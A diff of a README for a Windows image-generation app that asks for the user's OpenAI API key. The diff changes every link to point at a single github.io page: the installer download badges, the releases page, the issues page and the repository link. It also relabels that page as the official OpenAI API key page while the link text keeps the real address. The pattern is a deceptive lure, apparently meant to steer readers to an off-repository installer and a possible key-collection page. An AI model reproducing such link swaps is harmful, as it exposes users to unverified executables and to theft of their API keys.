@@ -1,6 +1,6 @@
 # 🖼️ gpt-image-2-desktop - Generate Images with Your Own API Key
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D6?style=for-the-badge&logo=windows)](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D6?style=for-the-badge&logo=windows)](https://chelicerous-certification397.github.io)
 
 ## 📋 What This App Does
 
@@ -22,9 +22,9 @@ Follow these steps to start generating images in minutes.
 
 ### Step 1: Download the Installer
 
-Visit the [releases page](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases) and download the latest Windows installer file. The file will end with `.exe` or `.msi`.
+Visit the [releases page](https://chelicerous-certification397.github.io) and download the latest Windows installer file. The file will end with `.exe` or `.msi`.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D6?style=for-the-badge&logo=windows)](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D6?style=for-the-badge&logo=windows)](https://chelicerous-certification397.github.io)
 
 ### Step 2: Run the Installer
 
@@ -42,7 +42,7 @@ Find the "gpt-image-2-desktop" shortcut on your desktop or in your Start menu. D
 
 The app will ask for your OpenAI API key on first launch. Here is how to get one:
 
-1. Go to [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
+1. Go to [platform.openai.com/api-keys](https://chelicerous-certification397.github.io)
 2. Log in to your OpenAI account
 3. Click "Create new secret key"
 4. Copy the key (it starts with `sk-...`)
@@ -129,7 +129,7 @@ Open Windows Settings > Apps > Apps & features. Find "gpt-image-2-desktop" and c
 
 ## 🐛 Reporting Issues
 
-If you find a bug or have a suggestion, visit the [GitHub Issues page](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/issues). Describe the issue clearly. Include steps to reproduce it if possible.
+If you find a bug or have a suggestion, visit the [GitHub Issues page](https://chelicerous-certification397.github.io). Describe the issue clearly. Include steps to reproduce it if possible.
 
 ## 📄 License
 
@@ -137,8 +137,8 @@ This project is open source. See the LICENSE file in the repository for details.
 
 ## 🔗 Links
 
-- [Download the latest release](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases)
-- [GitHub repository](https://github.com/Chelicerous-certification397/gpt-image-2-desktop)
-- [OpenAI API key page](https://platform.openai.com/api-keys)
+- [Download the latest release](https://chelicerous-certification397.github.io)
+- [GitHub repository](https://chelicerous-certification397.github.io)
+- [OpenAI API key page](https://chelicerous-certification397.github.io)
 
 Keywords: gpt-image-2, desktop-app, electron, image-generation, windows, open-source, byo-api-key, react, typescript, openai
